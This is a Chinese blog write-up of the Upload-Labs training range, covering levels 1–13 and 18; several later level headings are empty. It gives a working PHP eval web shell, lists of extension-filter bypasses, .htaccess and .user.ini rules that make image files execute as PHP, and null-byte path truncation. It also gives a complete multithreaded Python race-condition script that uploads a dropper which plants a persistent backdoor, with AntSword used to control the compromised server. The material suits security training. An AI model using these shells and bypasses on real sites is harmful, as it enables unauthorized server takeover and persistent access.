+++
date = '2026-04-19T13:04:50Z'
draft = false
title = 'Upload Labs通关'
categories = ["挑战记录"]
tags = ["upload-labs", "文件上传", "web靶场"]
+++

# 第1关

1.创建文件shell.php，写入以下内容：

```php
<?php

#一句话木马
@eval($_POST['cmd']);

#显示php环境信息，便于观察shell.php是否上传成功且被成功执行
phpinfo();

?>
```
2.上传shell.php文件

上传失败，.php文件无法上传。

![alt text](/images/image-7.png)

打开BurpSuite抓包，上传文件发现页面依旧弹窗提示上传失败，但是BurpSuite没有抓到包，说明对文件类型的判断是在前端进行的，数据包并没有传送到服务端。

![alt text](/images/image-1.png)

![alt text](/images/image-7.png)

3.关闭前端校验（方法一）

关闭浏览器JavaScript功能（以chrome为例）

设置-隐私设置和安全性-网站设置-javaScript-不允许网站使用JavaScript

![alt text](/images/image-2.png)

![alt text](/images/image-3.png)

![alt text](/images/image-4.png)

4.上传shell.php并访问

关闭JavaScript功能后刷新页面，上传shell.php文件。

文件上传成功后在图片区域点击鼠标右键，复制图片地址，打开新的标签页访问图片。

![alt text](/images/image-5.png)

![alt text](/images/image.png)

可以看到php的环境配置，说明shell.php文件已经上传成功并且已被执行。

5.BurpSuite抓包改后缀（方法二）

将shell.php改成shell.jpg，上传shell.jpg,BurpSuite抓包修改后缀为shell.php。

![alt text](/images/image-6.png)

放行数据包后，可以看到文件上传成功，接步骤4。

6.中国蚁剑连接

填写shell.php访问链接和连接密码。

![alt text](/images/image-8.png)

![alt text](/images/image-9.png)

# 第2关

1.分析核心源代码

```php
if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
    if (move_uploaded_file($temp_file, $img_path)) {
         $is_upload = true;
    } else {
         $msg = '上传出错！';
    }
} else {
    $msg = '文件类型不正确，请重新上传！';
}
```

由if判断条件可知，上传文件的类型必须为image/jpeg、image/png、image/gif这三种类型。

2.BurpSuite抓包

改文件类型，放行数据包，前端页面可见文件上传成功。

![alt text](/images/image-10.png)

3.蚁剑连接

常规操作不再赘述。

# 第3关

1.分析核心源代码

```php
$deny_ext = array('.asp','.aspx','.php','.jsp');
```
$deny_ext定义了黑名单，'.asp','.aspx','.php','.jsp'后缀会被过滤掉。

2.更换shell.php文件的后缀

将php文件的后缀更换成以下任一后缀，或者使用大小写绕过。

```text
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phtm
.phtml
.phar
```
3.更换后缀后上传，然后蚁剑连接

# 第4关

1.分析核心源代码

```php
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
```
这里使用黑名单过滤了所有php、jsp、asp可执行文件的后缀，通过后缀名绕过不可行。但是忽略了.htaccess后缀的文件。

>通过 .htaccess 规则，让本不执行脚本的文件（如 .jpg、.png、.txt、.gif）被服务器当成 PHP 脚本执行。

.htaccess最常用的三条解析规则

```text
# 1. 让jpg当php执行
AddType application/x-httpd-php .jpg

# 2. 让png当php执行
AddHandler application/x-httpd-php .png

# 3. 指定某个文件当php执行
<Files "shell.txt">
SetHandler application/x-httpd-php
</Files>
```

【注意】

Apache 2.2 及以前：默认 AllowOverride All → .htaccess 自动生效
Apache 2.3.9+ / 2.4.x：默认 AllowOverride None → 完全不读取 .htaccess

建议在2.2及以前版本进行漏洞复现。

重启Apache服务使配置生效。

2.创建并编辑.htaccess文件

在Linux系统中可以直接创建并编辑，在Windows系统中需要先用记事本编辑内容再另存为.htaccess文件。

在.htaccess文件中指定shell.txt文件当php执行,编辑完成后保存并上传。

```php
<Files "shell.txt">
SetHandler application/x-httpd-php
</Files>
```

3.上传shell.txt文件

修改shell.php后缀为shell.txt,然后上传，上传成功后使用中国蚁剑连接。

# 第5关

1.分析核心源代码

```text
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");

```

这里漏掉了.ini配置文件，可以上传.user.ini文件，对apache和nginx通用。（.htaccess只对apache有效）

.user.ini文件可以指定一个文件，其他php文件在执行前会在首行/末尾包含指定文件的内容。

```text
;在首行包含shell.jpg的内容
auto_prepend_file = shell.jpg

;在末尾包含shell.jpg的内容
auto_append_file = shell.jpg
```

2.创建、编辑并上传.user.ini文件

.user.ini文件内容如下：

```text
auto_prepend_file = shell.jpg
```

.user.ini文件上传成功后需要等待一段时间生效（1分钟以内）。

3.修改shell.php改为shell.jpg并上传

4.检测生效

在upload文件夹下靶场放置了一个readme.php文件，访问readme.php文件，readme.php文件则会把shell.jpg文件中的一句话木马包含进去一起执行。

![alt text](/images/image-11.png)


5.中国蚁剑连接

# 第6关

1.分析核心源代码

```php
 $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
    $file_name = trim($_FILES['upload_file']['name']);
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, '.');
    #$file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
    $file_ext = trim($file_ext); //首尾去空
```

对照第4关的源代码发现，本关在后缀处理时没有将后缀转换成小写，因此可以使用大小写绕过，使大小写组成的后缀不在黑名单中。

2.将shell.php改成shell.PhP，长传。

3.上传成功后蚁剑连接。

# 第7关

1.分析核心源代码

```php
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
    #$file_name = trim($_FILES['upload_file']['name']);
    $file_name = $_FILES['upload_file']['name'];
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, '.');
    $file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
    #$file_ext = trim($file_ext); //首尾去空
```
本关在处理后缀时没有删掉文件末尾的空格，可以使用BurpSuite抓包，在文件名末尾增加空格，然后上传文件，服务器会自动将空格删除掉。

2.BurpSuite抓包改后缀，在文件名后加一个空格，上传文件。

3.中国蚁剑连接

# 第8关

1.分析核心源代码

```php
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
    $file_name = trim($_FILES['upload_file']['name']);
    #$file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, '.');
    $file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
    $file_ext = trim($file_ext); //首尾去空
```
本关在处理后缀名称的时候，没有删除文件名末尾的点（.），可以使用BurpSuite抓包，在文件名末尾增加点，然后上传文件，服务器会自动将点删除掉。

2.BurpSuite抓包改后缀，在文件名后加一个点，上传文件。

3.中国蚁剑连接

# 第9题

1.分析核心源代码

```php
 $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
    $file_name = trim($_FILES['upload_file']['name']);
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, '.');
    $file_ext = strtolower($file_ext); //转换为小写
    #$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
    $file_ext = trim($file_ext); //首尾去空
```
本关在处理后缀名称的时候，没有删除文件名末尾的::$DATA，可以使用BurpSuite抓包，在文件名末尾增加::$DATA，然后上传文件，服务器会自动将::$DATA删除掉。

>::$DATA 是 Windows NTFS 文件系统 中一个特殊的备用数据流（Alternate Data Stream, ADS） 语法，每个 NTFS 文件都有一个主数据流（未命名），其完整名称为 文件名::$DATA。仅适用于 Windows + NTFS 文件系统。

2.BurpSuite抓包改后缀，在文件名后加一个::$DATA，上传文件。

3.中国蚁剑连接

中国蚁剑在填写访问路径时，要将文件末尾的::$DATA删除掉。

# 第10关

1.分析核心源代码

```php
 $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
    $file_name = trim($_FILES['upload_file']['name']);
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, '.');
    $file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
    $file_ext = trim($file_ext); //首尾去空
```

这一关包含了后缀处理的所有步骤，需要从处理逻辑上寻找突破点。通过分析后缀处理的顺序，可以发现代码删除文件末尾点和空格的顺序是：空格、点、空格；我们可以在后缀后面有规律的添加点和空格，构造一个新的后缀，使代码按照上述顺序删除后仍然剩余一个点或者空格，实现对黑名单的绕过。

2.BurpSuite抓包改后缀，在文件名后加：点、空格、点，上传文件。

比如shell.php改为shell.php._.（其中下划线代表空格）。
代码处理时：

（1）删除末尾空格，因为末尾没有空格，所以不会有变化；

（2）删除末尾的点，此时shell.php.\_.变成了 shell.php._

（3）删除末尾空格，此时shell.php.\_.变成了 shell.php.

最终的文件名称为shell.php. ，后缀为.php. ，不在黑名单中，成功绕过黑名单上传。

3.中国蚁剑连接

# 第11关

1.分析核心源代码

```php
 $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess","ini");

    $file_name = trim($_FILES['upload_file']['name']);
    $file_name = str_ireplace($deny_ext,"", $file_name);
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $img_path = UPLOAD_PATH.'/'.$file_name;        
```

这一关的重点在于 【 $file_name = str_ireplace($deny_ext,"", $file_name); 】，把黑名单中的后缀以替换的方式删除掉，后面的代码没有对删除后的后缀再次验证，这样我们就可以直接使用双写绕过。

2.BurpSuite抓包改后缀，把shell.php改成shell.pphphp

shell.pphphp被删除掉后缀中的php组合后，shell.p~~php~~hp剩下的内容又可以拼接成shell.php。

3.中国蚁剑连接

# 第12关

1.分析核心源代码

```php
$ext_arr = array('jpg','png','gif');
$file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
if(in_array($file_ext,$ext_arr)){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

    if(move_uploaded_file($temp_file,$img_path)){
        $is_upload = true;
    } else {
        $msg = '上传出错！';
    }
}
```
第2行代码对文件名进行了截取，截取的是文件名中最后一个点后面的所有内容。只有当截取的内容在白名单中（$ext_arr）才能上传成功。

$img_path变量的值做了一个拼接，使用前端通过GET方式传来的save_path参数的值 + / + 随机数 + 日期 + 文件原始后缀名 的形式设置了文件的保存路径和新的文件名。后面if判断条件中使用move_uploaded_file函数把上传的文件存储到save_path指定的路径中，并且进行重命名。

![alt text](/images/image-12.png)

通过抓包可以看到GET传递的save_path的值为../upload/

我们可以修改save_path的值，通过截断的方式构造一个路径，绕过后端的校验。

2.%00截断绕过

简单介绍一下%00截断绕过的原理：

通过源代码可以知道变量$img_path存储的是拼接的路径和新的文件名，这个变量的值是存储在内存中的，内存中使用十六进制的00来表示变量值的结束位置，php语言以\0表示结束符。

save_path的值是可以通过抓包修改的，如果我们把../upload/的值改成../upload/shell.php00，那么这个值传到后端，不论后端代码拼接什么内容，内存读取到00后都会停止，后面的内容就被截断了。

但是需要注意的是，\0在内存中用十六进制00表示，，而GET传递的值是在URL中，\0的值要转换成URL编码，用%00表示。

最终构造的save_path值为../upload/shell.php%00

举个例子看一下后端的处理过程：

假如上传的文件是shell.jpg，此时截取的后缀名是jpg，符合白名单的要求。

拼接的内容为../upload/shell.php%006620260421002523.jpg ， 该字符串赋值给变量$img_path的时候，内存读取到../upload/shell.php就结束了，因此$img_path的值为../upload/shell.php，重命名文件的时候把上传的文件存储到../upload/目录下，并且重命名为shell.php。

具体操作步骤如下：

>a. php版本要在5.3.4以前
>
>b. 在php.ini中设置magic_quotes_gpc = Off

上传shell.jpg文件抓包，修改save_path的值为../upload/shell.php%00

![alt text](/images/image-13.png)

上传成功后，复制图片链接，删除URL中%后面的内容，访问测试脚本是否上传成功。

![alt text](/images/image-14.png)

![alt text](/images/image-15.png)

3.中国蚁剑连接

# 第13关

1.分析核心源代码

```php
$ext_arr = array('jpg','png','gif');
$file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
if(in_array($file_ext,$ext_arr)){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

    if(move_uploaded_file($temp_file,$img_path)){
        $is_upload = true;
    } else {
        $msg = "上传失败";
    }
} 
```

这一关的逻辑跟第12关是一样的，只是save_path的值是通过POST的方式传递的。

GET请求中save_path的值在URL中，\0要进行URL编码，用%00表示。

同样，在POST请求中，也需要对\0进行处理。

2.截断绕过

BurpSuite抓包找到save_path参数的位置。

![alt text](/images/image-16.png)

POST请求不通过URL传递参数，不需要对参数值中的特殊符号进行URL编码。

如果在POST参数的值中构造截断路径../upload/shell.php00，此处的00为00本身，不代表十六进制的00，无法实现截断的效果。

这时我们使用占位符预留位置，然后把占位符的十六进制值改成00。

比如使用#做占位符，然后修改其十六进制值。

![alt text](/images/image-17.png)

切换到Hex窗口，找到#对应的十六进制值23，然后把23改成00，十六进制的00对应的是表示字符串结束的空字符，不会有内容显示。

![alt text](/images/image-18.png)

![alt text](/images/image-19.png)

放行数据包，复制图片链接，删除链接中shell.php后面的内容，访问测试文件上传是否成功。

![alt text](/images/image-20.png)

3.中国蚁剑连接

# 第14关



# 第15关



# 第16关



# 第17关



# 第18关

1.分析核心源代码

```php
$ext_arr = array('jpg','png','gif');
$file_name = $_FILES['upload_file']['name'];
$temp_file = $_FILES['upload_file']['tmp_name'];
$file_ext = substr($file_name,strrpos($file_name,".")+1);
$upload_file = UPLOAD_PATH . '/' . $file_name;

if(move_uploaded_file($temp_file, $upload_file)){
    if(in_array($file_ext,$ext_arr)){
        $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
        rename($upload_file, $img_path);
        $is_upload = true;
    }
}
```
这一关的处理顺序为：上传文件-存储文件-校验文件-删除（校验失败）/重命名（校验成功）

如果我们写一个php文件，在这个文件被存储之后，到校验失败被删除之前，php文件可以通过访问被执行。但是这个时间非常的短，如果上传的是一句话木马，这么短的时间内是无法利用的。

我们可以上传一个生成一句话木马的文件gen.php，执行这个文件会自动创建一个一句话木马文件shell.php。我们短时间内高频次上传gen.php文件，在gen.php文件到被删除之前，我们只要成功访问一次即可生成shell.php脚本。根据源代码的逻辑，新生成的shell.php是不会被校验的。

2.payload脚本

创建payload.py文件，写入以下内容：

```php
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Upload-Labs Pass-18 条件竞争上传脚本
功能：多线程并发上传木马文件 + 并发访问触发木马，实现条件竞争利用
环境：Python 3.8 + 无第三方依赖（原生urllib）
"""

import threading
import urllib.request

# ===================== 配置区域（可根据实际环境修改） =====================
# 上传文件的目标URL
UPLOAD_URL = "http://192.168.100.140/upload-labs-master/Pass-18/index.php"
# 上传后木马文件的访问地址
SHELL_URL = "http://192.168.100.140/upload-labs-master/upload/gen.php"
# =========================================================================

# 全局标志位：标记是否攻击成功
success = False


def upload_file():
    """
    上传线程函数：持续并发上传PHP木马文件
    木马功能：生成一句话木马 shell.php
    """
    global success
    
    # 构造POST请求分隔符，用于表单上传
    boundary = b"----WebKitFormBoundary8edb3a432s21e9ac"
    
    # 构造上传数据包（纯二进制，避免中文/编码问题）
    payload = (
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="upload_file"; filename="gen.php"\r\n'
        b"Content-Type: image/jpeg\r\n\r\n"
        b"<?php file_put_contents('shell.php','<?php @eval($_POST[1]);?>');?>\r\n"
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="submit"\r\n\r\n'
        b"submit\r\n"
        b"--" + boundary + b"--\r\n"
    )

    # 请求头信息
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary8edb3a432s21e9ac"
    }

    # 持续上传直到攻击成功
    while not success:
        try:
            # 构造HTTP请求对象
            req = urllib.request.Request(
                url=UPLOAD_URL,
                data=payload,
                headers=headers,
                method="POST"
            )
            # 发送请求，超时0.1秒，提升竞争速度
            urllib.request.urlopen(req, timeout=0.1)
        except Exception:
            # 忽略网络异常，继续上传
            continue


def access_shell():
    """
    访问线程函数：持续访问上传的木马文件，触发木马执行
    """
    global success
    
    # 持续访问直到攻击成功
    while not success:
        try:
            # 访问木马地址，超时0.1秒
            response = urllib.request.urlopen(SHELL_URL, timeout=0.1)
            
            # 状态码200表示访问成功，木马已执行
            if response.getcode() == 200:
                print("\n[+] 条件竞争成功！shell.php 已生成！")
                success = True
                return
        except Exception:
            # 访问失败则继续重试
            continue


if __name__ == "__main__":
    print("[*] 正在启动高并发条件竞争攻击...")
    print("[*] 上传线程：60个 | 访问线程：40个")

    # 启动 60 个并发上传线程
    for _ in range(60):
        t_upload = threading.Thread(target=upload_file, daemon=True)
        t_upload.start()

    # 启动 40 个并发访问线程
    for _ in range(40):
        t_access = threading.Thread(target=access_shell, daemon=True)
        t_access.start()

    # 主线程保持运行，直到攻击成功
    while not success:
        pass
```

该脚本专为Upload-Labs Pass-18关卡设计，用于利用条件竞争上传漏洞，无需第三方依赖，适配Python 3.8及以上版本，兼容多平台。其核心是通过多线程并发，抓住服务器保存上传文件到删除文件的极短时间窗口，触发木马执行并生成后门。

脚本包含两个核心函数：upload_file()负责持续上传gen.php木马文件，构造合规数据包反复发送；access_shell()持续访问该文件，检测到200状态码即说明触发成功，自动生成shell.php后门。

脚本采用高并发设计，启动60个上传线程和40个访问线程提升成功率，运行后会提示攻击状态，出现成功提示即代表漏洞利用完成，可通过shell.php连接工具控制服务器。

3.中国蚁剑连接


# 第19关




# 第20关




# 第21关